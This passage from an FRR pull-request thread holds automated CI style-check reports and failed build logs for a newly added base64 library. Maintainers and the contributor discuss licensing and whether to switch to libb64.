WARNING: please, no spaces at the start of a line\n    #207: FILE: /tmp/f1-30676/base64.c:207:\n    +    *p++ = '\\0';$\n    \n    WARNING: please, no spaces at the start of a line\n    #208: FILE: /tmp/f1-30676/base64.c:208:\n    +    return p - encoded;$\n    Report for base64.h | 35 issues\n    ===============================================\n    WARNING: Block comments should align the * on each line\n    #2: FILE: /tmp/f1-30676/base64.h:2:\n    +/*\n    +* Copyright (c) 2003 Apple Computer, Inc. All rights reserved.\n    \n    WARNING: Block comments should align the * on each line\n    #26: FILE: /tmp/f1-30676/base64.h:26:\n    +/* ====================================================================\n    +* Copyright (c) 1995-1999 The Apache Group.  All rights reserved.\n    \n    ERROR: \"foo * bar\" should be \"foo *bar\"\n    #92: FILE: /tmp/f1-30676/base64.h:92:\n    +int Base64encode(char * coded_dst, const char *plain_src,int len_plain_src);\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #92: FILE: /tmp/f1-30676/base64.h:92:\n    +int Base64encode(char * coded_dst, const char *plain_src,int len_plain_src);\n                                                             ^\n    \n    ERROR: \"foo * bar\" should be \"foo *bar\"\n    #94: FILE: /tmp/f1-30676/base64.h:94:\n    +int Base64decode_len(const char * coded_src);\n    \n    ERROR: \"foo * bar\" should be \"foo *bar\"\n    #95: FILE: /tmp/f1-30676/base64.h:95:\n    +int Base64decode(char * plain_dst, const char *coded_src);\n    \n    WARNING: adding a line without newline at end of file\n    #101: FILE: /tmp/f1-30676/base64.h:101:\n    +#endif //_BASE64_H_\n    \n    WARNING: C99 // comments do not match recommendation\n    #101: FILE: /tmp/f1-30676/base64.h:101:\n    +#endif //_BASE64_H_\n    Report for yang_wrappers.c | 6 issues\n    ===============================================\n    < WARNING: Missing a blank line after declarations\n    < #688: FILE: /tmp/f1-30676/yang_wrappers.c:688:\n    < WARNING: Missing a blank line after declarations\n    < #690: FILE: /tmp/f1-30676/yang_wrappers.c:690:\n    < WARNING: Missing a blank line after declarations\n    < #701: FILE: /tmp/f1-30676/yang_wrappers.c:701:\n\n</details>\n\n</details> > Mixed messages at https://www.gnu.org/philosophy/apsl.en.html , but the recommendation is to avoid using it.\r\n> \r\n> I suggest we use a different implementation, ex:\r\n> \r\n> https://salsa.debian.org/alteholz/libb64/-/tree/master/\r\n\r\nDo you reach a consensus on using this library https://salsa.debian.org/alteholz/libb64/-/tree/master/ ? <details><summary>Continuous Integration Result: SUCCESSFUL</summary>\n\n#  Continuous Integration Result: SUCCESSFUL\n\nCongratulations, this patch passed basic tests\n\nTested-by: NetDEF / OpenSourceRouting.org CI System\n\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3399/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n\n### Warnings Generated during build:\n\n<details><summary>Checkout code: Successful with additional warnings</summary>\n\n    Report for base64.c | 197 issues\n    ===============================================\n    ERROR: that open brace { should be on the previous line\n    #91: FILE: /tmp/f1-14805/base64.c:91:\n    +static const unsigned char pr2six[256] =\n    +{\n    \n    WARNING: please, no spaces at the start of a line\n    #93: FILE: /tmp/f1-14805/base64.c:93:\n    +    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,$\n    \n    WARNING: please, no spaces at the start of a line\n    #94: FILE: /tmp/f1-14805/base64.c:94:\n    +    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,$\n    \n    WARNING: please, no spaces at the start of a line\n    #95: FILE: /tmp/f1-14805/base64.c:95:\n    +    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 62, 64, 64, 64, 63,$\n    \n    WARNING: please, no spaces at the start of a line\n    #96: FILE: /tmp/f1-14805/base64.c:96:\n    +    52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 64, 64, 64, 64, 64, 64,$\n    \n    WARNING: please, no spaces at the start of a line\n    #97: FILE: /tmp/f1-14805/base64.c:97:\n    +    64,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14,$\n    \n    WARNING: please, no spaces at the start of a line\n    #98: FILE: /tmp/f1-14805/base64.c:98:\n    +    15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 64, 64, 64, 64, 64,$\n    \n    WARNING: please, no spaces at the start of a line\n    #99: FILE: /tmp/f1-14805/base64.c:99:\n    +    64, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,$\n    \n    WARNING: please, no spaces at the start of a line\n    #100: FILE: /tmp/f1-14805/base64.c:100:\n    +    41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 64, 64, 64, 64, 64,$\n    \n    WARNING: please, no spaces at the start of a line\n    #101: FILE: /tmp/f1-14805/base64.c:101:\n    +    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,$\n    \n    WARNING: please, no spaces at the start of a line\n    #102: FILE: /tmp/f1-14805/base64.c:102:\n    +    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,$\n    \n    WARNING: please, no spaces at the start of a line\n    #103: FILE: /tmp/f1-14805/base64.c:103:\n    +    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,$\n    \n    WARNING: please, no spaces at the start of a line\n    #104: FILE: /tmp/f1-14805/base64.c:104:\n    +    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,$\n    \n    WARNING: please, no spaces at the start of a line\n    #105: FILE: /tmp/f1-14805/base64.c:105:\n    +    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,$\n    \n    WARNING: please, no spaces at the start of a line\n    #106: FILE: /tmp/f1-14805/base64.c:106:\n    +    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,$\n    \n    WARNING: please, no spaces at the start of a line\n    #107: FILE: /tmp/f1-14805/base64.c:107:\n    +    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,$\n    \n    WARNING: please, no spaces at the start of a line\n    #108: FILE: /tmp/f1-14805/base64.c:108:\n    +    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64$\n    \n    WARNING: please, no spaces at the start of a line\n    #113: FILE: /tmp/f1-14805/base64.c:113:\n    +    int nbytesdecoded;$\n    \n    WARNING: Missing a blank line after declarations\n    #114: FILE: /tmp/f1-14805/base64.c:114:\n    +    int nbytesdecoded;\n    +    register const unsigned char *bufin;\n    \n    WARNING: please, no spaces at the start of a line\n    #114: FILE: /tmp/f1-14805/base64.c:114:\n    +    register const unsigned char *bufin;$\n    \n    WARNING: please, no spaces at the start of a line\n    #115: FILE: /tmp/f1-14805/base64.c:115:\n    +    register int nprbytes;$\n    \n    WARNING: please, no spaces at the start of a line\n    #117: FILE: /tmp/f1-14805/base64.c:117:\n    +    bufin = (const unsigned char *) bufcoded;$\n    \n    WARNING: please, no spaces at the start of a line\n    #118: FILE: /tmp/f1-14805/base64.c:118:\n    +    while (pr2six[*(bufin++)] <= 63);$\n    \n    ERROR: trailing statements should be on next line\n    #118: FILE: /tmp/f1-14805/base64.c:118:\n    +    while (pr2six[*(bufin++)] <= 63);\n    \n    WARNING: please, no spaces at the start of a line\n    #120: FILE: /tmp/f1-14805/base64.c:120:\n    +    nprbytes = (bufin - (const unsigned char *) bufcoded) - 1;$\n    \n    WARNING: please, no spaces at the start of a line\n    #121: FILE: /tmp/f1-14805/base64.c:121:\n    +    nbytesdecoded = ((nprbytes + 3) / 4) * 3;$\n    \n    WARNING: please, no spaces at the start of a line\n    #123: FILE: /tmp/f1-14805/base64.c:123:\n    +    return nbytesdecoded + 1;$\n    \n    WARNING: please, no spaces at the start of a line\n    #128: FILE: /tmp/f1-14805/base64.c:128:\n    +    int nbytesdecoded;$\n    \n    WARNING: please, no spaces at the start of a line\n    #129: FILE: /tmp/f1-14805/base64.c:129:\n    +    register const unsigned char *bufin;$\n    \n    WARNING: please, no spaces at the start of a line\n    #130: FILE: /tmp/f1-14805/base64.c:130:\n    +    register unsigned char *bufout;$\n    \n    WARNING: please, no spaces at the start of a line\n    #131: FILE: /tmp/f1-14805/base64.c:131:\n    +    register int nprbytes;$\n    \n    WARNING: please, no spaces at the start of a line\n    #133: FILE: /tmp/f1-14805/base64.c:133:\n    +    bufin = (const unsigned char *) bufcoded;$\n    \n    WARNING: please, no spaces at the start of a line\n    #134: FILE: /tmp/f1-14805/base64.c:134:\n    +    while (pr2six[*(bufin++)] <= 63);$\n    \n    ERROR: trailing statements should be on next line\n    #134: FILE: /tmp/f1-14805/base64.c:134:\n    +    while (pr2six[*(bufin++)] <= 63);\n    \n    WARNING: please, no spaces at the start of a line\n    #135: FILE: /tmp/f1-14805/base64.c:135:\n    +    nprbytes = (bufin - (const unsigned char *) bufcoded) - 1;$\n    \n    WARNING: please, no spaces at the start of a line\n    #136: FILE: /tmp/f1-14805/base64.c:136:\n    +    nbytesdecoded = ((nprbytes + 3) / 4) * 3;$\n    \n    WARNING: please, no spaces at the start of a line\n    #138: FILE: /tmp/f1-14805/base64.c:138:\n    +    bufout = (unsigned char *) bufplain;$\n    \n    WARNING: please, no spaces at the start of a line\n    #139: FILE: /tmp/f1-14805/base64.c:139:\n    +    bufin = (const unsigned char *) bufcoded;$\n    \n    WARNING: please, no spaces at the start of a line\n    #141: FILE: /tmp/f1-14805/base64.c:141:\n    +    while (nprbytes > 4) {$\n    \n    WARNING: suspect code indent for conditional statements (4, 4)\n    #141: FILE: /tmp/f1-14805/base64.c:141:\n    +    while (nprbytes > 4) {\n    +    *(bufout++) =\n    \n    WARNING: please, no spaces at the start of a line\n    #142: FILE: /tmp/f1-14805/base64.c:142:\n    +    *(bufout++) =$\n    \n    ERROR: code indent should use tabs where possible\n    #143: FILE: /tmp/f1-14805/base64.c:143:\n    +        (unsigned char) (pr2six[*bufin] << 2 | pr2six[bufin[1]] >> 4);$\n    \n    WARNING: please, no spaces at the start of a line\n    #143: FILE: /tmp/f1-14805/base64.c:143:\n    +        (unsigned char) (pr2six[*bufin] << 2 | pr2six[bufin[1]] >> 4);$\n    \n    WARNING: please, no spaces at the start of a line\n    #144: FILE: /tmp/f1-14805/base64.c:144:\n    +    *(bufout++) =$\n    \n    ERROR: code indent should use tabs where possible\n    #145: FILE: /tmp/f1-14805/base64.c:145:\n    +        (unsigned char) (pr2six[bufin[1]] << 4 | pr2six[bufin[2]] >> 2);$\n    \n    WARNING: please, no spaces at the start of a line\n    #145: FILE: /tmp/f1-14805/base64.c:145:\n    +        (unsigned char) (pr2six[bufin[1]] << 4 | pr2six[bufin[2]] >> 2);$\n    \n    WARNING: please, no spaces at the start of a line\n    #146: FILE: /tmp/f1-14805/base64.c:146:\n    +    *(bufout++) =$\n    \n    ERROR: code indent should use tabs where possible\n    #147: FILE: /tmp/f1-14805/base64.c:147:\n    +        (unsigned char) (pr2six[bufin[2]] << 6 | pr2six[bufin[3]]);$\n    \n    WARNING: please, no spaces at the start of a line\n    #147: FILE: /tmp/f1-14805/base64.c:147:\n    +        (unsigned char) (pr2six[bufin[2]] << 6 | pr2six[bufin[3]]);$\n    \n    WARNING: please, no spaces at the start of a line\n    #148: FILE: /tmp/f1-14805/base64.c:148:\n    +    bufin += 4;$\n    \n    WARNING: please, no spaces at the start of a line\n    #149: FILE: /tmp/f1-14805/base64.c:149:\n    +    nprbytes -= 4;$\n    \n    WARNING: please, no spaces at the start of a line\n    #150: FILE: /tmp/f1-14805/base64.c:150:\n    +    }$\n    \n    WARNING: please, no spaces at the start of a line\n    #153: FILE: /tmp/f1-14805/base64.c:153:\n    +    if (nprbytes > 1) {$\n    \n    WARNING: suspect code indent for conditional statements (4, 4)\n    #153: FILE: /tmp/f1-14805/base64.c:153:\n    +    if (nprbytes > 1) {\n    +    *(bufout++) =\n    \n    WARNING: please, no spaces at the start of a line\n    #154: FILE: /tmp/f1-14805/base64.c:154:\n    +    *(bufout++) =$\n    \n    ERROR: code indent should use tabs where possible\n    #155: FILE: /tmp/f1-14805/base64.c:155:\n    +        (unsigned char) (pr2six[*bufin] << 2 | pr2six[bufin[1]] >> 4);$\n    \n    WARNING: please, no spaces at the start of a line\n    #155: FILE: /tmp/f1-14805/base64.c:155:\n    +        (unsigned char) (pr2six[*bufin] << 2 | pr2six[bufin[1]] >> 4);$\n    \n    WARNING: please, no spaces at the start of a line\n    #156: FILE: /tmp/f1-14805/base64.c:156:\n    +    }$\n    \n    WARNING: please, no spaces at the start of a line\n    #157: FILE: /tmp/f1-14805/base64.c:157:\n    +    if (nprbytes > 2) {$\n    \n    WARNING: suspect code indent for conditional statements (4, 4)\n    #157: FILE: /tmp/f1-14805/base64.c:157:\n    +    if (nprbytes > 2) {\n    +    *(bufout++) =\n    \n    WARNING: please, no spaces at the start of a line\n    #158: FILE: /tmp/f1-14805/base64.c:158:\n    +    *(bufout++) =$\n    \n    ERROR: code indent should use tabs where possible\n    #159: FILE: /tmp/f1-14805/base64.c:159:\n    +        (unsigned char) (pr2six[bufin[1]] << 4 | pr2six[bufin[2]] >> 2);$\n    \n    WARNING: please, no spaces at the start of a line\n    #159: FILE: /tmp/f1-14805/base64.c:159:\n    +        (unsigned char) (pr2six[bufin[1]] << 4 | pr2six[bufin[2]] >> 2);$\n    \n    WARNING: please, no spaces at the start of a line\n    #160: FILE: /tmp/f1-14805/base64.c:160:\n    +    }$\n    \n    WARNING: please, no spaces at the start of a line\n    #161: FILE: /tmp/f1-14805/base64.c:161:\n    +    if (nprbytes > 3) {$\n    \n    WARNING: suspect code indent for conditional statements (4, 4)\n    #161: FILE: /tmp/f1-14805/base64.c:161:\n    +    if (nprbytes > 3) {\n    +    *(bufout++) =\n    \n    WARNING: please, no spaces at the start of a line\n    #162: FILE: /tmp/f1-14805/base64.c:162:\n    +    *(bufout++) =$\n    \n    ERROR: code indent should use tabs where possible\n    #163: FILE: /tmp/f1-14805/base64.c:163:\n    +        (unsigned char) (pr2six[bufin[2]] << 6 | pr2six[bufin[3]]);$\n    \n    WARNING: please, no spaces at the start of a line\n    #163: FILE: /tmp/f1-14805/base64.c:163:\n    +        (unsigned char) (pr2six[bufin[2]] << 6 | pr2six[bufin[3]]);$\n    \n    WARNING: please, no spaces at the start of a line\n    #164: FILE: /tmp/f1-14805/base64.c:164:\n    +    }$\n    \n    WARNING: please, no spaces at the start of a line\n    #166: FILE: /tmp/f1-14805/base64.c:166:\n    +    *(bufout++) = '\\0';$\n    \n    WARNING: please, no spaces at the start of a line\n    #167: FILE: /tmp/f1-14805/base64.c:167:\n    +    nbytesdecoded -= (4 - nprbytes) & 3;$\n    \n    WARNING: please, no spaces at the start of a line\n    #168: FILE: /tmp/f1-14805/base64.c:168:\n    +    return nbytesdecoded;$\n    \n    WARNING: please, no spaces at the start of a line\n    #172: FILE: /tmp/f1-14805/base64.c:172:\n    +    \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";$\n    \n    WARNING: please, no spaces at the start of a line\n    #176: FILE: /tmp/f1-14805/base64.c:176:\n    +    return ((len + 2) / 3 * 4) + 1;$\n    \n    WARNING: please, no spaces at the start of a line\n    #181: FILE: /tmp/f1-14805/base64.c:181:\n    +    int i;$\n    \n    WARNING: please, no spaces at the start of a line\n    #182: FILE: /tmp/f1-14805/base64.c:182:\n    +    char *p;$\n    \n    WARNING: please, no spaces at the start of a line\n    #184: FILE: /tmp/f1-14805/base64.c:184:\n    +    p = encoded;$\n    \n    WARNING: please, no spaces at the start of a line\n    #185: FILE: /tmp/f1-14805/base64.c:185:\n    +    for (i = 0; i < len - 2; i += 3) {$\n    \n    WARNING: suspect code indent for conditional statements (4, 4)\n    #185: FILE: /tmp/f1-14805/base64.c:185:\n    +    for (i = 0; i < len - 2; i += 3) {\n    +    *p++ = basis_64[(string[i] >> 2) & 0x3F];\n    \n    WARNING: please, no spaces at the start of a line\n    #186: FILE: /tmp/f1-14805/base64.c:186:\n    +    *p++ = basis_64[(string[i] >> 2) & 0x3F];$\n    \n    WARNING: please, no spaces at the start of a line\n    #187: FILE: /tmp/f1-14805/base64.c:187:\n    +    *p++ = basis_64[((string[i] & 0x3) << 4) |$\n    \n    ERROR: code indent should use tabs where possible\n    #188: FILE: /tmp/f1-14805/base64.c:188:\n    +                    ((int) (string[i + 1] & 0xF0) >> 4)];$\n    \n    WARNING: please, no spaces at the start of a line\n    #188: FILE: /tmp/f1-14805/base64.c:188:\n    +                    ((int) (string[i + 1] & 0xF0) >> 4)];$\n    \n    WARNING: please, no spaces at the start of a line\n    #189: FILE: /tmp/f1-14805/base64.c:189:\n    +    *p++ = basis_64[((string[i + 1] & 0xF) << 2) |$\n    \n    ERROR: code indent should use tabs where possible\n    #190: FILE: /tmp/f1-14805/base64.c:190:\n    +                    ((int) (string[i + 2] & 0xC0) >> 6)];$\n    \n    WARNING: please, no spaces at the start of a line\n    #190: FILE: /tmp/f1-14805/base64.c:190:\n    +                    ((int) (string[i + 2] & 0xC0) >> 6)];$\n    \n    WARNING: please, no spaces at the start of a line\n    #191: FILE: /tmp/f1-14805/base64.c:191:\n    +    *p++ = basis_64[string[i + 2] & 0x3F];$\n    \n    WARNING: please, no spaces at the start of a line\n    #192: FILE: /tmp/f1-14805/base64.c:192:\n    +    }$\n    \n    WARNING: please, no spaces at the start of a line\n    #193: FILE: /tmp/f1-14805/base64.c:193:\n    +    if (i < len) {$\n    \n    WARNING: suspect code indent for conditional statements (4, 4)\n    #193: FILE: /tmp/f1-14805/base64.c:193:\n    +    if (i < len) {\n    +    *p++ = basis_64[(string[i] >> 2) & 0x3F];\n    \n    WARNING: please, no spaces at the start of a line\n    #194: FILE: /tmp/f1-14805/base64.c:194:\n    +    *p++ = basis_64[(string[i] >> 2) & 0x3F];$\n    \n    WARNING: please, no spaces at the start of a line\n    #195: FILE: /tmp/f1-14805/base64.c:195:\n    +    if (i == (len - 1)) {$\n    \n    ERROR: code indent should use tabs where possible\n    #196: FILE: /tmp/f1-14805/base64.c:196:\n    +        *p++ = basis_64[((string[i] & 0x3) << 4)];$\n    \n    WARNING: please, no spaces at the start of a line\n    #196: FILE: /tmp/f1-14805/base64.c:196:\n    +        *p++ = basis_64[((string[i] & 0x3) << 4)];$\n    \n    ERROR: code indent should use tabs where possible\n    #197: FILE: /tmp/f1-14805/base64.c:197:\n    +        *p++ = '=';$\n    \n    WARNING: please, no spaces at the start of a line\n    #197: FILE: /tmp/f1-14805/base64.c:197:\n    +        *p++ = '=';$\n    \n    WARNING: please, no spaces at the start of a line\n    #198: FILE: /tmp/f1-14805/base64.c:198:\n    +    }$\n    \n    WARNING: please, no spaces at the start of a line\n    #199: FILE: /tmp/f1-14805/base64.c:199:\n    +    else {$\n    \n    ERROR: else should follow close brace '}'\n    #199: FILE: /tmp/f1-14805/base64.c:199:\n    +    }\n    +    else {\n    \n    ERROR: code indent should use tabs where possible\n    #200: FILE: /tmp/f1-14805/base64.c:200:\n    +        *p++ = basis_64[((string[i] & 0x3) << 4) |$\n    \n    WARNING: please, no spaces at the start of a line\n    #200: FILE: /tmp/f1-14805/base64.c:200:\n    +        *p++ = basis_64[((string[i] & 0x3) << 4) |$\n    \n    ERROR: code indent should use tabs where possible\n    #201: FILE: /tmp/f1-14805/base64.c:201:\n    +                        ((int) (string[i + 1] & 0xF0) >> 4)];$\n    \n    WARNING: please, no spaces at the start of a line\n    #201: FILE: /tmp/f1-14805/base64.c:201:\n    +                        ((int) (string[i + 1] & 0xF0) >> 4)];$\n    \n    ERROR: code indent should use tabs where possible\n    #202: FILE: /tmp/f1-14805/base64.c:202:\n    +        *p++ = basis_64[((string[i + 1] & 0xF) << 2)];$\n    \n    WARNING: please, no spaces at the start of a line\n    #202: FILE: /tmp/f1-14805/base64.c:202:\n    +        *p++ = basis_64[((string[i + 1] & 0xF) << 2)];$\n    \n    WARNING: please, no spaces at the start of a line\n    #203: FILE: /tmp/f1-14805/base64.c:203:\n    +    }$\n    \n    WARNING: please, no spaces at the start of a line\n    #204: FILE: /tmp/f1-14805/base64.c:204:\n    +    *p++ = '=';$\n    \n    WARNING: please, no spaces at the start of a line\n    #205: FILE: /tmp/f1-14805/base64.c:205:\n    +    }$\n    \n    WARNING: please, no spaces at the start of a line\n    #207: FILE: /tmp/f1-14805/base64.c:207:\n    +    *p++ = '\\0';$\n    \n    WARNING: please, no spaces at the start of a line\n    #208: FILE: /tmp/f1-14805/base64.c:208:\n    +    return p - encoded;$\n    Report for base64.h | 31 issues\n    ===============================================\n    WARNING: Block comments should align the * on each line\n    #2: FILE: /tmp/f1-14805/base64.h:2:\n    +/*\n    +* Copyright (c) 2003 Apple Computer, Inc. All rights reserved.\n    \n    WARNING: Block comments should align the * on each line\n    #26: FILE: /tmp/f1-14805/base64.h:26:\n    +/* ====================================================================\n    +* Copyright (c) 1995-1999 The Apache Group.  All rights reserved.\n    \n    ERROR: \"foo * bar\" should be \"foo *bar\"\n    #92: FILE: /tmp/f1-14805/base64.h:92:\n    +int Base64encode(char * coded_dst, const char *plain_src,int len_plain_src);\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #92: FILE: /tmp/f1-14805/base64.h:92:\n    +int Base64encode(char * coded_dst, const char *plain_src,int len_plain_src);\n                                                             ^\n    \n    ERROR: \"foo * bar\" should be \"foo *bar\"\n    #94: FILE: /tmp/f1-14805/base64.h:94:\n    +int Base64decode_len(const char * coded_src);\n    \n    ERROR: \"foo * bar\" should be \"foo *bar\"\n    #95: FILE: /tmp/f1-14805/base64.h:95:\n    +int Base64decode(char * plain_dst, const char *coded_src);\n    \n    WARNING: C99 // comments do not match recommendation\n    #101: FILE: /tmp/f1-14805/base64.h:101:\n    +#endif //_BASE64_H_\n    Report for yang_wrappers.c | 6 issues\n    ===============================================\n    < WARNING: Missing a blank line after declarations\n    < #688: FILE: /tmp/f1-14805/yang_wrappers.c:688:\n    < WARNING: Missing a blank line after declarations\n    < #690: FILE: /tmp/f1-14805/yang_wrappers.c:690:\n    < WARNING: Missing a blank line after declarations\n    < #701: FILE: /tmp/f1-14805/yang_wrappers.c:701:\n\n</details>\n\n</details> @whichbug , let us go with libb64 source code please.  > @whichbug , let us go with libb64 source code please.\r\n\r\nupdated. but you can see from the CI results that this libb64 leads to a lot of compiler warnings, and some warnings lead to failure of compiling. To eliminate these compilation failures, I have to slightly revise the code in libb64. \r\n\r\nperhaps we need to find another reliable base64 lib. please suggest if more changes are required. <details><summary>Continuous Integration Result: FAILED</summary>\n\n#  Continuous Integration Result: FAILED\n\nSee below for issues.\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n### Get source / Pull Request: Successful\n### Building Stage: Failed\n<details>\n<summary>FreeBSD 11 amd64 build: Failed (click for details)</summary>\n\n__Make failed for FreeBSD 11 amd64 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/CI009BUILD/ErrorLog/log_make.txt)\n\n    /usr/home/ci/cibuild.3563/frr-source/doc/user/zebra.rst:1380: WARNING: duplicate clicmd description of debug zebra pbr, other instance in pbr\n    lib/base64.c: In function 'base64_encode_block':\n    lib/base64.c:48:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:49:3: note: here\n    lib/base64.c:59:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:60:3: note: here\n    lib/base64.c: In function 'base64_decode_block':\n    lib/base64.c:158:18: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:159:3: note: here\n\nFreeBSD 11 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/CI009BUILD/config.status/config.status\nFreeBSD 11 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/CI009BUILD/config.log/config.log.gz\n</details>\n<details>\n<summary>Debian 10 amd64 build: Failed (click for details)</summary>\nDebian 10 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/DEB10BUILD/config.log/config.log.gz\n\n__Make failed for Debian 10 amd64 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/DEB10BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3563/frr-source'\n    lib/base64.c: In function base64_encode_block:\n    lib/base64.c:48:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:49:3: note: here\n    lib/base64.c:59:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:60:3: note: here\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:158:18: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:159:3: note: here\n\nDebian 10 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/DEB10BUILD/config.status/config.status\n</details>\n<details>\n<summary>Ubuntu 16.04 arm7 build: Failed (click for details)</summary>\nUbuntu 16.04 arm7 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/CI101BUILD/config.status/config.status\nUbuntu 16.04 arm7 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/CI101BUILD/config.log/config.log.gz\n\n__Make failed for Ubuntu 16.04 arm7 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/CI101BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3563/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:125:15: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:157:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:168:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:180:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:192:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    cc1: all warnings being treated as errors\n\n</details>\n<details>\n<summary>Debian 11 amd64 build: Failed (click for details)</summary>\nDebian 11 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/DEB11AMD64/config.status/config.status\n\n__Make failed for Debian 11 amd64 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/DEB11AMD64/ErrorLog/log_make.txt)\n\n    /home/ci/cibuild.3563/frr-source/doc/user/zebra.rst:1380: WARNING: duplicate clicmd description of debug zebra pbr, other instance in pbr\n    lib/base64.c: In function base64_encode_block:\n    lib/base64.c:48:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:49:3: note: here\n    lib/base64.c:59:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:60:3: note: here\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:158:18: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:159:3: note: here\n\nDebian 11 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/DEB11AMD64/config.log/config.log.gz\n</details>\n<details>\n<summary>Ubuntu 16.04 arm8 build: Failed (click for details)</summary>\n\n__Make failed for Ubuntu 16.04 arm8 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/U16ARM8BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3563/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:125:15: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:157:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:168:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:180:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:192:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    cc1: all warnings being treated as errors\n\nUbuntu 16.04 arm8 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/U16ARM8BUILD/config.log/config.log.gz\nUbuntu 16.04 arm8 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/U16ARM8BUILD/config.status/config.status\n</details>\n<details>\n<summary>Ubuntu 18.04 amd64 build: Failed (click for details)</summary>\n\n__Make failed for Ubuntu 18.04 amd64 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/U1804AMD64/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3563/frr-source'\n    lib/base64.c: In function base64_encode_block:\n    lib/base64.c:48:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:49:3: note: here\n    lib/base64.c:59:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:60:3: note: here\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:158:18: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:159:3: note: here\n\nUbuntu 18.04 amd64 build: config.status output from configure 